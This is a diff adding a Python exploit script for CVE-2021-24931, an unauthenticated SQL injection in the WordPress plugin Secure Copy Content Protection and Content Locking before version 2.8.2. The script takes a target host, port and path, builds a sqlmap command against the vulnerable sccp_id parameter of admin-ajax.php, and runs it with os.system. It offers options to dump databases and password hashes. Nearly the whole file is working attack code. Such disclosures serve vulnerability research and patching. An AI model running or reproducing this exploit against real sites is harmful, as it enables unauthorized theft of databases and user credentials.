@@ -1,0 +1,64 @@
+# Exploit Title: WordPress Plugin Secure Copy Content Protection and Content Locking 2.8.1 - SQL-Injection (Unauthenticated)
+# Date 08.02.2022
+# Exploit Author: Ron Jost (Hacker5preme)
+# Vendor Homepage: https://ays-pro.com/
+# Software Link: https://downloads.wordpress.org/plugin/secure-copy-content-protection.2.8.1.zip
+# Version: < 2.8.2
+# Tested on: Ubuntu 20.04
+# CVE: CVE-2021-24931
+# CWE: CWE-89
+# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24931/README.md
+
+'''
+Description:
+The Secure Copy Content Protection and Content Locking WordPress plugin before 2.8.2 does not escape the
+sccp_id parameter of the ays_sccp_results_export_file AJAX action (available to both unauthenticated
+and authenticated users) before using it in a SQL statement, leading to an SQL injection.
+'''
+
+banner = '''
+
+ .--. .-..-. .--.       .---.  .--. .---.   ,-.       .---.   .-. .--. .----.  ,-.
+: .--': :: :: .--'      `--. :: ,. :`--. :.'  :       `--. : .'.': .; :`--  ;.'  :
+: :   : :: :: `;  _____   ,',': :: :  ,',' `: : _____   ,','.'.'_`._, : .' '  `: :
+: :__ : `' ;: :__:_____:.'.'_ : :; :.'.'_   : ::_____:.'.'_ :_ ` :  : : _`,`.  : :
+`.__.' `.,' `.__.'      :____;`.__.':____;  :_;       :____;  :_:   :_:`.__.'  :_;
+
+						[+] Copy Content Protection and Content Locking - SQL Injection
+						[@] Developed by Ron Jost (Hacker5preme)
+
+'''
+print(banner)
+import argparse
+from datetime import datetime
+import os
+
+# User-Input:
+my_parser = argparse.ArgumentParser(description= 'Copy Content Protection and Content Locking SQL-Injection (unauthenticated)')
+my_parser.add_argument('-T', '--IP', type=str)
+my_parser.add_argument('-P', '--PORT', type=str)
+my_parser.add_argument('-U', '--PATH', type=str)
+args = my_parser.parse_args()
+target_ip = args.IP
+target_port = args.PORT
+wp_path = args.PATH
+
+# Exploit:
+print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))
+print('[*] Payload for SQL-Injection:')
+exploitcode_url = r'sqlmap "http://' + target_ip + ':' + target_port + wp_path + r'wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)*&type=json" '
+print('    Sqlmap options:')
+print('     -a, --all           Retrieve everything')
+print('     -b, --banner        Retrieve DBMS banner')
+print('     --current-user      Retrieve DBMS current user')
+print('     --current-db        Retrieve DBMS current database')
+print('     --passwords         Enumerate DBMS users password hashes')
+print('     --tables            Enumerate DBMS database tables')
+print('     --columns           Enumerate DBMS database table column')
+print('     --schema            Enumerate DBMS schema')
+print('     --dump              Dump DBMS database table entries')
+print('     --dump-all          Dump all DBMS databases tables entries')
+retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
+exploitcode = exploitcode_url +  retrieve_mode + ' --answers="follow=Y" --batch -v 0'
+os.system(exploitcode)
+print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
